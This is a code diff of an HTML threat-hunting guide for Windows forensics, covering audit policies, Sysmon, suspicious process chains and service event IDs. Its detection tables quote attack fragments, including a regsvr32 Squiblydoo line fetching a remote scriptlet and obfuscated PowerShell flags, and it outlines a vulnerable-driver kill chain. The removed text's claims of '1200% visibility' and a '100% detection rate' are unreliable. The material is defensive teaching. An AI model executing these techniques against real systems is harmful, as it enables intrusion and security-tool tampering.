@@ -1,545 +1,849 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Event Viewer Forensics: The 1:1 Master Guide</title>
-    <style>
-        /* CSS Variables & Theming */
-        :root {
-            --bg-main: #090b10;
-            --bg-panel: #131722;
-            --bg-card: #1c2130;
-            --border-color: #2b3245;
-            --text-main: #d1d5db;
-            --text-muted: #8b949e;
-            --accent-blue: #3b82f6;
-            --accent-cyan: #06b6d4;
-            --danger: #ef4444;
-            --warning: #f59e0b;
-            --success: #10b981;
-            --code-bg: #0d1117;
-            --font-main: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            --font-mono: 'Consolas', 'Courier New', monospace;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Courses Guide | Riddy Security Suite</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root {
+  --primary-dark: #0a0e17;
+  --bg-panel: #111827;
+  --bg-card: #1a2235;
+  --accent-blue: #2962ff;
+  --light-blue: #bbdefb;
+  --accent-cyan: #06b6d4;
+  --danger: #ff1744;
+  --warning: #ffab00;
+  --success: #00c853;
+  --info: #00b0ff;
+  --border: rgba(41,98,255,0.25);
+  --text: #e3f2fd;
+  --muted: #8b949e;
+  --font-mono: 'Consolas','Courier New',monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,var(--primary-dark) 0%,#1a237e 100%);color:var(--text);min-height:100vh;display:flex;flex-direction:column;}
 
-        /* Base Resets */
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: var(--font-main); background-color: var(--bg-main); color: var(--text-main); line-height: 1.6; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        
-        /* Typography */
-        h1, h2, h3, h4 { color: #ffffff; font-weight: 600; margin-bottom: 0.5rem; }
-        h1 { font-size: 1.8rem; letter-spacing: -0.5px; }
-        h2 { font-size: 1.5rem; border-bottom: 2px solid var(--border-color); padding-bottom: 0.5rem; margin-top: 1.5rem; margin-bottom: 1rem; color: var(--accent-cyan); }
-        h3 { font-size: 1.2rem; color: var(--accent-blue); margin-top: 1.5rem; }
-        p { margin-bottom: 1rem; }
-        
-        /* Header & Back Buttons */
-        header { background-color: var(--bg-panel); border-bottom: 1px solid var(--border-color); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
-        .header-subtitle { color: var(--text-muted); font-size: 0.9rem; margin-top: 0.2rem; }
-        .header-actions { display: flex; align-items: center; gap: 15px; }
-        .version-badge { background: rgba(59, 130, 246, 0.1); color: var(--accent-blue); padding: 0.3rem 0.8rem; border-radius: 999px; font-size: 0.8rem; font-weight: bold; border: 1px solid rgba(59, 130, 246, 0.3); }
-        
-        /* Way 1: Header Back Button */
-        .back-btn { text-decoration: none; color: white; background-color: rgba(59, 130, 246, 0.2); padding: 0.5rem 1rem; border-radius: 4px; font-size: 0.9rem; transition: 0.2s; border: 1px solid rgba(59, 130, 246, 0.4); font-weight: bold; }
-        .back-btn:hover { background-color: rgba(59, 130, 246, 0.4); }
+/* ── HEADER ── */
+.site-header{background:rgba(10,14,23,0.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;}
+.site-header h1{font-size:1.9rem;background:linear-gradient(to right,var(--light-blue),var(--accent-blue));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.site-header p{font-size:.85rem;color:var(--muted);margin-top:.2rem;}
+.back-btn{text-decoration:none;color:#fff;background:rgba(41,98,255,.2);border:1px solid rgba(41,98,255,.4);padding:.5rem 1rem;border-radius:6px;font-size:.9rem;transition:.2s;font-weight:600;}
+.back-btn:hover{background:rgba(41,98,255,.4);}
 
-        /* Way 2: Sidebar Back Button */
-        .sidebar-back-btn { display: block; margin: 1rem 1.5rem 0 1.5rem; text-decoration: none; color: #ffffff; background-color: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); padding: 0.8rem 1rem; border-radius: 6px; text-align: center; font-weight: 600; font-size: 0.9rem; transition: all 0.2s ease; }
-        .sidebar-back-btn:hover { background-color: rgba(239, 68, 68, 0.25); }
+/* ── SEARCH BAR ── */
+.search-wrap{padding:1.5rem 2rem 0;max-width:700px;margin:0 auto;width:100%;}
+.search-box{display:flex;align-items:center;gap:.75rem;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:50px;padding:.7rem 1.2rem;backdrop-filter:blur(16px);box-shadow:0 4px 20px rgba(0,0,0,.3);transition:border .2s;}
+.search-box:focus-within{border-color:var(--accent-blue);}
+.search-box i{color:var(--accent-blue);font-size:1.1rem;}
+.search-box input{background:transparent;border:none;outline:none;color:var(--text);font-size:1rem;flex:1;}
+.search-box input::placeholder{color:var(--muted);}
 
-        /* Layout */
-        .app-container { display: flex; flex: 1; overflow: hidden; }
-        
-        /* Sidebar Navigation */
-        .sidebar { width: 320px; background-color: var(--bg-panel); border-right: 1px solid var(--border-color); overflow-y: auto; padding: 0 0 1rem 0; }
-        .nav-category { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); padding: 0.5rem 1.5rem; margin-top: 1rem; font-weight: bold; }
-        .tab-btn { display: block; width: 100%; text-align: left; background: transparent; border: none; color: var(--text-main); padding: 0.8rem 1.5rem 0.8rem 2rem; font-size: 0.95rem; cursor: pointer; transition: all 0.2s ease; border-left: 3px solid transparent; position: relative; }
-        .tab-btn:hover { background-color: rgba(255, 255, 255, 0.05); }
-        .tab-btn.active { background-color: rgba(6, 182, 212, 0.1); border-left-color: var(--accent-cyan); color: #ffffff; font-weight: 500; }
-        
-        /* Main Content Area */
-        .main-content { flex: 1; overflow-y: auto; padding: 2rem 3rem; background-color: var(--bg-main); position: relative; scroll-behavior: smooth; }
-        .tab-pane { display: none; animation: fadeIn 0.4s ease-out forwards; }
-        .tab-pane.active { display: block; }
-        
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+/* ── MAIN TABS NAV ── */
+.main-tabs{display:flex;gap:.5rem;padding:1.25rem 2rem .5rem;overflow-x:auto;scrollbar-width:none;flex-wrap:wrap;}
+.main-tabs::-webkit-scrollbar{display:none;}
+.mtab{background:rgba(10,14,23,.6);border:1px solid var(--border);color:var(--muted);padding:.6rem 1.1rem;border-radius:8px;cursor:pointer;font-size:.88rem;font-weight:600;transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:.45rem;}
+.mtab:hover{background:rgba(41,98,255,.15);color:var(--text);}
+.mtab.active{background:linear-gradient(135deg,rgba(41,98,255,.35),rgba(6,182,212,.2));border-color:var(--accent-blue);color:#fff;box-shadow:0 0 12px rgba(41,98,255,.3);}
 
-        /* Component: Cards */
-        .event-card { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
-        .event-header { display: flex; align-items: center; margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem; }
-        
-        /* Component: Badges & Paths */
-        .eid-badge { font-family: var(--font-mono); font-weight: bold; padding: 0.3rem 0.6rem; border-radius: 4px; font-size: 0.9rem; }
-        .eid-danger { background-color: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
-        .eid-warning { background-color: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
-        .eid-info { background-color: rgba(59, 130, 246, 0.15); color: var(--accent-blue); border: 1px solid rgba(59, 130, 246, 0.3); }
-        
-        .log-path { display: inline-flex; align-items: center; font-family: var(--font-mono); font-size: 0.85rem; color: #a5d6ff; background-color: rgba(165, 214, 255, 0.05); padding: 0.3rem 0.8rem; border-radius: 4px; border: 1px dashed var(--border-color); margin-bottom: 1rem; width: 100%; }
-        .log-path::before { content: '📂'; margin-right: 8px; }
+/* ── CONTENT AREA ── */
+.content-wrap{flex:1;padding:1.5rem 2rem 3rem;max-width:1300px;margin:0 auto;width:100%;}
+.tab-pane{display:none;animation:fadeIn .35s ease;}
+.tab-pane.active{display:block;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
 
-        /* Component: Data Tables */
-        table { width: 100%; border-collapse: separate; border-spacing: 0; margin: 1rem 0; border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; }
-        th, td { padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 0.9rem; }
-        th { background-color: rgba(255, 255, 255, 0.03); color: var(--accent-cyan); font-weight: 600; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 0.5px; }
-        tr:last-child td { border-bottom: none; }
-        tbody tr:hover { background-color: rgba(255, 255, 255, 0.02); }
+/* ── CARDS ── */
+.card{background:rgba(10,14,23,.7);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;backdrop-filter:blur(10px);box-shadow:0 8px 25px rgba(0,0,0,.3);}
+.card h2{font-size:1.4rem;color:var(--accent-cyan);border-bottom:1px solid var(--border);padding-bottom:.6rem;margin-bottom:1rem;display:flex;align-items:center;gap:.6rem;}
+.card h3{font-size:1.1rem;color:var(--light-blue);margin:1.2rem 0 .6rem;}
+.card h4{font-size:.95rem;color:var(--accent-blue);margin:.9rem 0 .4rem;}
+.card p{margin-bottom:.8rem;line-height:1.65;color:#c9d1d9;}
 
-        /* Component: Code & Preformatted */
-        code { font-family: var(--font-mono); background-color: var(--code-bg); color: #ff7b72; padding: 0.2rem 0.4rem; border-radius: 3px; font-size: 0.85em; border: 1px solid rgba(255, 255, 255, 0.05); }
-        pre { background-color: var(--code-bg); padding: 1rem; border-radius: 6px; overflow-x: auto; border: 1px solid var(--border-color); margin: 1rem 0; }
-        pre code { background-color: transparent; border: none; padding: 0; color: #e6edf3; font-size: 0.9rem; }
-        
-        /* Component: Alert Boxes */
-        .alert { padding: 1rem 1.5rem; border-radius: 6px; margin: 1rem 0; border-left: 4px solid; display: flex; flex-direction: column; gap: 0.5rem; }
-        .alert-sus { background-color: rgba(239, 68, 68, 0.05); border-left-color: var(--danger); }
-        .alert-sus strong { color: var(--danger); }
-        .alert-def { background-color: rgba(16, 185, 129, 0.05); border-left-color: var(--success); }
-        .alert-def strong { color: var(--success); }
+/* ── EVENT BADGES ── */
+.eid{font-family:var(--font-mono);font-weight:700;padding:.25rem .6rem;border-radius:4px;font-size:.82rem;display:inline-block;margin:.15rem .15rem .15rem 0;}
+.eid-danger{background:rgba(255,23,68,.12);color:var(--danger);border:1px solid rgba(255,23,68,.3);}
+.eid-warn{background:rgba(255,171,0,.12);color:var(--warning);border:1px solid rgba(255,171,0,.3);}
+.eid-info{background:rgba(0,176,255,.12);color:var(--info);border:1px solid rgba(0,176,255,.3);}
+.eid-ok{background:rgba(0,200,83,.12);color:var(--success);border:1px solid rgba(0,200,83,.3);}
 
-        /* Component: Step-by-Step Lists */
-        .step-list { margin-left: 0; padding-left: 0; list-style-type: none; counter-reset: step-counter; }
-        .step-list li { position: relative; padding-left: 2.5rem; margin-bottom: 0.8rem; }
-        .step-list li::before { content: counter(step-counter); counter-increment: step-counter; position: absolute; left: 0; top: -0.1rem; background-color: var(--accent-blue); color: white; width: 1.5rem; height: 1.5rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: bold; }
+/* ── LOG PATH ── */
+.log-path{font-family:var(--font-mono);font-size:.82rem;color:#a5d6ff;background:rgba(165,214,255,.05);border:1px dashed var(--border);border-radius:4px;padding:.35rem .8rem;margin:.5rem 0 1rem;display:inline-block;}
+.log-path::before{content:'📂 ';}
 
-        /* Component: Grid Layouts */
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
-        @media (max-width: 1024px) { .grid-2 { grid-template-columns: 1fr; } }
-    </style>
+/* ── ALERTS ── */
+.alert{padding:1rem 1.2rem;border-radius:6px;border-left:4px solid;margin:.75rem 0;font-size:.9rem;}
+.alert-sus{background:rgba(255,23,68,.06);border-color:var(--danger);}
+.alert-sus strong{color:var(--danger);}
+.alert-def{background:rgba(0,200,83,.06);border-color:var(--success);}
+.alert-def strong{color:var(--success);}
+.alert-info{background:rgba(0,176,255,.06);border-color:var(--info);}
+.alert-info strong{color:var(--info);}
+.alert-warn{background:rgba(255,171,0,.06);border-color:var(--warning);}
+.alert-warn strong{color:var(--warning);}
+
+/* ── CODE ── */
+code{font-family:var(--font-mono);background:rgba(0,0,0,.4);color:#ff7b72;padding:.15rem .4rem;border-radius:3px;font-size:.84em;border:1px solid rgba(255,255,255,.06);}
+pre{background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:1rem;overflow-x:auto;margin:.75rem 0;}
+pre code{background:transparent;border:none;color:#e6edf3;font-size:.88rem;padding:0;}
+.cmd-block{background:#0d1117;border:1px solid rgba(41,98,255,.3);border-radius:8px;padding:1rem;margin:.75rem 0;position:relative;}
+.cmd-block::before{content:'CMD';position:absolute;top:.4rem;right:.7rem;font-size:.7rem;color:var(--accent-blue);font-family:var(--font-mono);font-weight:700;}
+.cmd-block code{background:transparent;border:none;color:#79c0ff;font-size:.9rem;}
+
+/* ── TABLES ── */
+table{width:100%;border-collapse:separate;border-spacing:0;margin:.75rem 0;border:1px solid var(--border);border-radius:8px;overflow:hidden;font-size:.88rem;}
+th,td{padding:.7rem 1rem;text-align:left;border-bottom:1px solid var(--border);}
+th{background:rgba(255,255,255,.03);color:var(--accent-cyan);font-weight:600;text-transform:uppercase;font-size:.78rem;letter-spacing:.5px;}
+tr:last-child td{border-bottom:none;}
+tbody tr:hover{background:rgba(255,255,255,.02);}
+
+/* ── STEP LIST ── */
+.step-list{list-style:none;counter-reset:step;padding-left:0;margin:.5rem 0;}
+.step-list li{position:relative;padding-left:2.4rem;margin-bottom:.7rem;line-height:1.6;color:#c9d1d9;}
+.step-list li::before{content:counter(step);counter-increment:step;position:absolute;left:0;top:.05rem;background:var(--accent-blue);color:#fff;width:1.5rem;height:1.5rem;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;}
+
+/* ── TOOL LINKS ── */
+.tool-link{display:inline-flex;align-items:center;gap:.4rem;background:rgba(41,98,255,.15);border:1px solid rgba(41,98,255,.35);color:var(--light-blue);padding:.4rem .85rem;border-radius:6px;text-decoration:none;font-size:.85rem;font-weight:600;transition:all .2s;margin:.25rem .25rem .25rem 0;}
+.tool-link:hover{background:rgba(41,98,255,.3);color:#fff;}
+
+/* ── GRID ── */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;}
+@media(max-width:860px){.grid2{grid-template-columns:1fr;}.main-tabs{gap:.35rem;}}
+
+/* ── SIDEBAR FOR EV ── */
+.ev-layout{display:flex;gap:1.5rem;}
+.ev-sidebar{width:240px;flex-shrink:0;}
+.ev-sidebar-nav{background:rgba(10,14,23,.7);border:1px solid var(--border);border-radius:12px;padding:.75rem;position:sticky;top:100px;}
+.ev-sidebar-nav .cat{font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);padding:.6rem .6rem .2rem;font-weight:700;}
+.ev-nav-btn{display:block;width:100%;text-align:left;background:transparent;border:none;color:var(--muted);padding:.55rem .75rem;font-size:.82rem;cursor:pointer;border-radius:6px;transition:all .2s;border-left:3px solid transparent;}
+.ev-nav-btn:hover{background:rgba(255,255,255,.05);color:var(--text);}
+.ev-nav-btn.active{background:rgba(6,182,212,.1);border-left-color:var(--accent-cyan);color:#fff;font-weight:600;}
+.ev-main{flex:1;min-width:0;}
+@media(max-width:900px){.ev-layout{flex-direction:column;}.ev-sidebar{width:100%;}.ev-sidebar-nav{position:static;}}
+</style>
 </head>
 <body>
 
-    <header>
-        <div>
-            <h1>Event Viewer Forensics: The 1:1 Master Guide</h1>
-            <p class="header-subtitle">Comprehensive threat hunting telemetry for Win 10, Win 11, and Win 12 architectures.</p>
+<header class="site-header">
+  <div>
+    <h1><i class="fas fa-graduation-cap"></i> Courses Guide</h1>
+    <p>Advanced Forensic Analysis &amp; Threat Hunting — Windows 10 / 11 / 12</p>
+  </div>
+  <a href="../../index.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back to Scanner</a>
+</header>
+
+<div class="search-wrap">
+  <div class="search-box">
+    <i class="fas fa-search"></i>
+    <input type="text" id="searchInput" placeholder="Search events, tools, artifacts, reason codes…" oninput="handleSearch(this.value)">
+  </div>
+</div>
+
+<nav class="main-tabs">
+  <button class="mtab active" onclick="switchMain('ev')"><i class="fas fa-eye"></i> Event Viewer</button>
+  <button class="mtab" onclick="switchMain('usn')"><i class="fas fa-database"></i> USN Journal</button>
+  <button class="mtab" onclick="switchMain('prefetch')"><i class="fas fa-bolt"></i> Prefetch</button>
+  <button class="mtab" onclick="switchMain('srum')"><i class="fas fa-chart-bar"></i> SRUM</button>
+  <button class="mtab" onclick="switchMain('amcache')"><i class="fas fa-archive"></i> Amcache</button>
+  <button class="mtab" onclick="switchMain('mft')"><i class="fas fa-folder-open"></i> MFT</button>
+  <button class="mtab" onclick="switchMain('appcompat')"><i class="fas fa-history"></i> AppCompatCache</button>
+  <button class="mtab" onclick="switchMain('timeline')"><i class="fas fa-stream"></i> Timeline Explorer</button>
+</nav>
+
+<div class="content-wrap">
+
+<!-- ══════════════ EVENT VIEWER TAB ══════════════ -->
+<div id="tab-ev" class="tab-pane active">
+  <div class="ev-layout">
+    <aside class="ev-sidebar">
+      <div class="ev-sidebar-nav">
+        <div class="cat">Foundation</div>
+        <button class="ev-nav-btn active" onclick="switchEV(this,'ev-prereqs')">0. Prerequisites &amp; Setup</button>
+        <div class="cat">System Activity</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-process')">1. Process Creation</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-services')">2. Service Start / Stop</button>
+        <div class="cat">Evasion &amp; Anti-Forensics</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-antiforensics')">3. Anti-Forensics &amp; Log Clearing</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-timestomp')">4. Timestomping</button>
+        <div class="cat">Hardware Attacks</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-usb')">5. USB &amp; Device Plug / Unplug</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-dma')">6. DMA / PCIe Attacks</button>
+        <div class="cat">Deep System</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-uefi')">7. UEFI &amp; Secure Boot</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-kernel')">8. Kernel Drivers &amp; BYOVD</button>
+        <div class="cat">In-Memory</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-memory')">9. Memory Injections</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-fileless')">10. PowerShell &amp; Fileless</button>
+        <div class="cat">Defender</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-defender')">11. Windows Defender Logs</button>
+        <div class="cat">Persistence &amp; Network</div>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-persistence')">12. Persistence &amp; Tasks</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-network')">13. Network &amp; C2</button>
+        <button class="ev-nav-btn" onclick="switchEV(this,'ev-crashes')">14. Crashes &amp; Bad Pointers</button>
+      </div>
+    </aside>
+
+    <main class="ev-main">
+
+      <!-- 0: PREREQS -->
+      <div id="ev-prereqs" class="ev-section">
+        <div class="card">
+          <h2><i class="fas fa-cog"></i> Module 0: Prerequisites &amp; ETW Architecture</h2>
+          <p>All Windows logging flows through <strong>Event Tracing for Windows (ETW)</strong>. The kernel emits structured events through ETW providers; Event Viewer is just a consumer. Without enabling the right audit policies and installing <strong>Sysmon</strong>, you see less than 30% of what actually happens.</p>
+          <h3>Enable These via <code>gpedit.msc</code> Before Hunting</h3>
+          <ul class="step-list">
+            <li><strong>Audit Process Creation (Success + Failure):</strong> <code>Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Detailed Tracking &gt; Audit Process Creation</code></li>
+            <li><strong>Include Command Line in 4688:</strong> <code>Computer Configuration &gt; Administrative Templates &gt; System &gt; Audit Process Creation &gt; Include command line in process creation events</code> — Without this, 4688 only tells you <em>what</em> ran, not <em>how</em>.</li>
+            <li><strong>PowerShell Script Block Logging:</strong> <code>Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows PowerShell &gt; Turn on Script Block Logging</code></li>
+            <li><strong>Audit Logon Events, Object Access, Privilege Use:</strong> Enable all under Advanced Audit Policy Configuration.</li>
+            <li><strong>Install Sysmon:</strong> Download from Sysinternals, use a SwiftOnSecurity config: <code>sysmon.exe -accepteula -i sysmonconfig.xml</code></li>
+          </ul>
+          <div class="alert alert-info"><strong>All timestamps in Event Viewer are UTC.</strong> Always correlate with the system timezone offset when presenting evidence to users in local time.</div>
         </div>
-        
-        <div class="header-actions">
-            <a href="../../index.html" class="back-btn">← Back to Scanner</a>
-            <div class="version-badge">Version 2026.1 | Threat Level: APT</div>
+      </div>
+
+      <!-- 1: PROCESS CREATION -->
+      <div id="ev-process" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-terminal"></i> Module 1: Process Creation</h2>
+          <p>Process Creation is the single most powerful telemetry source. Every executable that runs leaves a 4688 (native) or Sysmon ID 1 record — with command-line arguments if you enabled the policy above.</p>
+
+          <div style="margin-bottom:1.5rem;">
+            <span class="eid eid-danger">Event ID 4688</span><span class="eid eid-info">Sysmon ID 1</span>
+            <h3>New Process Created</h3>
+            <span class="log-path">Windows Logs &gt; Security (4688) | Sysmon &gt; Operational (ID 1)</span>
+            <p><strong>Key Fields to Examine:</strong></p>
+            <table>
+              <tr><th>Field</th><th>What to Look For</th></tr>
+              <tr><td><code>New Process Name</code></td><td>Path of the executable. Anything outside <code>C:\Windows\System32</code>, <code>Program Files</code>, or a trusted app folder is suspicious.</td></tr>
+              <tr><td><code>Process Command Line</code></td><td>The full argument string. Look for <code>-enc</code>, base64 blobs, <code>-nop -w hidden</code>, <code>IEX</code>, <code>Invoke-Expression</code>.</td></tr>
+              <tr><td><code>Creator Process Name</code></td><td>The parent. <code>winword.exe</code> spawning <code>cmd.exe</code> = macro malware. <code>explorer.exe</code> spawning <code>mshta.exe</code> = drive-by download.</td></tr>
+              <tr><td><code>Token Elevation Type</code></td><td>Type 2 = full admin token, no UAC. Type 3 = impersonated. Unexpected elevation = privilege escalation.</td></tr>
+              <tr><td><code>IntegrityLevel</code> (Sysmon)</td><td>System = kernel-level. High = admin. Medium = normal user. Unexpected System-level process = rootkit.</td></tr>
+            </table>
+            <h4>High-Value Suspicious Parent→Child Chains</h4>
+            <table>
+              <tr><th>Parent Process</th><th>Child Process</th><th>Why It's SUS</th></tr>
+              <tr><td><code>winword.exe / excel.exe</code></td><td><code>cmd.exe / powershell.exe / wscript.exe</code></td><td>Office macro executing shell command — classic initial access.</td></tr>
+              <tr><td><code>explorer.exe</code></td><td><code>mshta.exe / wscript.exe / cscript.exe</code></td><td>HTML Application or script execution from a file double-click.</td></tr>
+              <tr><td><code>svchost.exe</code></td><td><code>cmd.exe / powershell.exe</code></td><td>Service host spawning command shell — service exploitation or scheduled task abuse.</td></tr>
+              <tr><td><code>lsass.exe</code></td><td>Any process</td><td>LSASS should never spawn children. Credential dumping or memory injection artifact.</td></tr>
+              <tr><td><code>msiexec.exe</code></td><td><code>powershell.exe / cmd.exe</code></td><td>MSI installer running a shell — malicious installer package.</td></tr>
+              <tr><td><code>rundll32.exe</code></td><td>Network connections (Sysmon ID 3)</td><td>rundll32 making outbound connections = DLL side-loading or shellcode staging.</td></tr>
+              <tr><td><code>regsvr32.exe</code></td><td>Any / network</td><td>Squiblydoo: <code>regsvr32 /s /n /u /i:http://... scrobj.dll</code> — bypasses AppLocker.</td></tr>
+            </table>
+            <div class="alert alert-sus"><strong>Obfuscation Indicators in Command Line:</strong> Look for carets <code>^</code> inline, ENV var slicing (<code>%COMSPEC:~0,3%</code>), string concatenation, and <code>-enc</code> (PowerShell EncodedCommand). These are evasion hallmarks.</div>
+          </div>
         </div>
-    </header>
+      </div>
 
-    <div class="app-container">
-        
-        <div class="sidebar">
-            <a href="../../index.html" class="sidebar-back-btn">← Return to Riddy Suite</a>
-
-            <div class="nav-category">Foundation</div>
-            <button class="tab-btn active" onclick="switchTab('tab-intro')">0. Architecture & Prerequisites</button>
-            
-            <div class="nav-category">Evasion & Hardware</div>
-            <button class="tab-btn" onclick="switchTab('tab-antiforensics')">1. Anti-Forensics & Log Clearing</button>
-            <button class="tab-btn" onclick="switchTab('tab-hardware')">2. USB, PCI & DMA Hardware</button>
-            
-            <div class="nav-category">Deep System Access</div>
-            <button class="tab-btn" onclick="switchTab('tab-uefi')">3. UEFI Bootkits & Signatures</button>
-            <button class="tab-btn" onclick="switchTab('tab-kernel')">4. Kernel Drivers & Ring-0</button>
-            
-            <div class="nav-category">In-Memory Execution</div>
-            <button class="tab-btn" onclick="switchTab('tab-memory')">5. Memory & Thread Injections</button>
-            <button class="tab-btn" onclick="switchTab('tab-fileless')">6. PowerShell & Fileless Malware</button>
-            
-            <div class="nav-category">Post-Exploitation</div>
-            <button class="tab-btn" onclick="switchTab('tab-persistence')">7. Persistence & Tasks</button>
-            <button class="tab-btn" onclick="switchTab('tab-network')">8. Web Requests & C2 Traffic</button>
-            <button class="tab-btn" onclick="switchTab('tab-crashes')">9. Crashed Files & Errors</button>
+      <!-- 2: SERVICES -->
+      <div id="ev-services" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-server"></i> Module 2: Service Start / Stop</h2>
+          <span class="eid eid-danger">Event ID 7045</span><span class="eid eid-danger">Event ID 4697</span><span class="eid eid-warn">Event ID 7036</span><span class="eid eid-info">Event ID 7040</span>
+          <span class="log-path">Windows Logs &gt; System (7036, 7040, 7045) | Security (4697)</span>
+          <table>
+            <tr><th>Event ID</th><th>Meaning</th><th>Hunt Focus</th></tr>
+            <tr><td><span class="eid eid-danger">7045 / 4697</span></td><td>New service installed</td><td>ImagePath outside <code>System32\drivers</code>, Service Type = <em>kernel mode driver</em>, random names like <code>xKrnl64.sys</code>.</td></tr>
+            <tr><td><span class="eid eid-warn">7036</span></td><td>Service entered Running/Stopped state</td><td>Sequence: <code>DiagTrack</code> or <code>WinDefend</code> stopped then unknown service started = anti-forensics stack pivot.</td></tr>
+            <tr><td><span class="eid eid-info">7040</span></td><td>Service start type changed</td><td>Defender service changed from Automatic → Disabled = tampering attempt.</td></tr>
+          </table>
+          <h3>BYOVD (Bring Your Own Vulnerable Driver) Kill Chain</h3>
+          <ul class="step-list">
+            <li>Attacker drops a known-vulnerable but legitimately signed <code>.sys</code> driver (e.g., old <code>RTCore64.sys</code>, <code>gdrv.sys</code>) → generates <strong>7045</strong> or <strong>4697</strong>.</li>
+            <li>They exploit the driver's IOCTL to disable kernel callbacks (PPL, PatchGuard bypass) → enables kernel write.</li>
+            <li>They map unsigned malicious shellcode into kernel space using the now-vulnerable driver → no further log entry.</li>
+            <li>They stop the vulnerable driver service (generates <strong>7036</strong> Stopped) to clean up.</li>
+          </ul>
+          <div class="alert alert-sus"><strong>Red Flags:</strong> Service ImagePath in <code>%TEMP%</code>, <code>C:\Users\Public\</code>, or any <code>AppData</code> subfolder. Legitimate kernel drivers live in <code>C:\Windows\System32\drivers\</code>.</div>
+          <h3>Detecting Security Tool Termination</h3>
+          <p>Hunt for <strong>7036</strong> events where <code>ServiceName</code> matches: <code>WinDefend</code>, <code>MsMpSvc</code>, <code>SysmonDrv</code>, <code>DiagTrack</code>, <code>EventLog</code>, <code>SecurityHealthService</code>. Any of these stopping unexpectedly without a planned maintenance window is a critical indicator.</p>
         </div>
+      </div>
 
-        <div class="main-content">
-
-            <div id="tab-intro" class="tab-pane active">
-                <h2>Module 0: The ETW Architecture (Win 10/11/12)</h2>
-                <p>Welcome to the most comprehensive Event Viewer guide in existence. To understand detection, you must understand the source: <strong>Event Tracing for Windows (ETW)</strong>. Whether you are hunting on Windows 10, Windows 11, or preparing for Windows 12, the underlying NT Kernel logs data through ETW providers.</p>
-                <p>Native Event Viewer is powerful, but it is blind to deep C++ memory hooks and external API calls. To achieve 1200% visibility and the 100% detection rate you require, you <strong>must</strong> pair native Windows logs with Microsoft Sysmon (System Monitor).</p>
-
-                <div class="event-card">
-                    <h3>The Golden Prerequisites</h3>
-                    <p>If these features are not enabled via Local Group Policy Editor (<code>gpedit.msc</code>), you will miss the malware entirely.</p>
-                    <ul class="step-list" style="margin-top: 1rem;">
-                        <li><strong>Audit Process Creation:</strong> Enable <code>Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Detailed Tracking > Audit Process Creation</code> (Success and Failure).</li>
-                        <li><strong>Include Command Line in Process Creation Events:</strong> Enable <code>Computer Configuration > Administrative Templates > System > Audit Process Creation</code>. Without this, you only see that <code>cmd.exe</code> ran, not the malicious string it executed.</li>
-                        <li><strong>PowerShell Script Block Logging:</strong> Enable <code>Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging</code>.</li>
